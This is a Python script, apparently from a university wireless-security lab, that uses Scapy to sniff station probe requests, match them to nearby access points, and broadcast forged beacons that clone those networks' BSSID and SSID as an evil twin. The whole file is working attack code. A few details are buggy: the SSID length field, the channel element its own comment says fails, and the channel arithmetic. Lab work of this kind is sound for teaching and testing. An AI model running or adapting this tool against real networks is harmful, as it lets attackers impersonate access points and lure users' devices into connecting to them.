#!/usr/bin/env python3

"""
SWI laboratory - script n°4

Author: Rébecca Tevaearai, Rosy-Laure Wonjamouna

Created: 26th March, 2022

"""

from scapy.all import *
from argparse import ArgumentParser as AP

ssid_list = []
ap_list = []

start_hopper = True


def hopper(interface):
    """
    Channel hopper
    """
    while start_hopper:
        channel = random.randrange(1, 12)
        os.system("iwconfig %s channel %d" % (interface, channel))
        time.sleep(0.5)


def setChannel(interface, channel): 
    os.system('iwconfig %s channel %d' % (interface, channel))   


def evil_twin(channel, target_mac, target_ssid, interface):
    """
    Function that create a fake twin of an AP by sending beacon packet 
    with the same BSSID and SSID but on a different channel. 
    """
    setChannel(interface, channel) # fix the channel on the given one
    dot11 = Dot11(type = 0, subtype = 8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = target_mac, addr3 = target_mac) # addr1 = broadcast
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID = 'SSID', info = target_ssid, len = len(target_mac))
    dsset = Dot11Elt(ID="DSset", info=chr(channel)) # set the channel (doesn't work)
    packet = RadioTap()/dot11/beacon/essid/dsset # create the packet with the parameters created before
    sendp(packet, inter = 0.1, iface = args.interface, loop = 1, verbose = 0) # send the crafted beacon indefinitly


def scan_sta_searching_ssid(pkt):
    """
    Function to scan STA trying to find an SSID
    """
    if pkt.haslayer(Dot11ProbeReq):
        stats = pkt[Dot11ProbeReq].network_stats()
        channel = stats.get("channel")
        if pkt.info not in ssid_list:
            print("STA:", pkt.addr2, "on Channel:", channel, "searching for SSID:", pkt.info.decode())
            ssid_list.append(pkt.info)


def scan_ap(pkt):
    """
    Function to see if the SSID found before exist or not
    """
    if pkt.haslayer(Dot11Beacon):
        stats = pkt[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        if pkt.info in ssid_list:
            print("Index:", len(ap_list), "  AP:", pkt.addr2, "  Channel:", channel, "  SSID:", pkt.info.decode())
            ap_list.append([pkt.addr2, pkt.info, channel])
            ssid_list.remove(pkt.info)


def show_STAs(interface):
    """
    Scan STA searching an SSID then check if those SSID exist
    """
    print("Scanning STA searching for a specific SSID\n")
    sniff(iface=interface, prn=scan_sta_searching_ssid, timeout=20)
    if len(ssid_list) == 0:
        print('No STA searching an SSID found')
        exit(0)
    print("\nScanning SSID found before\n")
    sniff(iface=interface, prn=scan_ap, timeout=20)


if __name__ == '__main__':
    parser = AP(description = "Evil twin script")
    parser.add_argument("-i", "--interface", required = True, help = "the interface name")
    args = parser.parse_args()

    # start the channel hopper to discover more packet
    thread = threading.Thread(target=hopper, args=(args.interface, ), name="hopper")
    thread.start()

    show_STAs(args.interface) 

    start_hopper = False # stop the channel hopper

    index = input("\nCreate evil twin ? [y/n]")

    # create a new thread to create an evil twin for every SSID found
    if index == 'y':
        for i in ap_list:
            target_mac, target_ssid, channel = i
            if channel == None:
                channel = 1
            fake_channel = channel + 6 % 12 # 6 channel away from the original one
            thread = threading.Thread(target=evil_twin, args=(fake_channel, target_mac, target_ssid, args.interface, ), name="evil twin" + target_ssid.decode())
            thread.start()
    else:
        exit(0)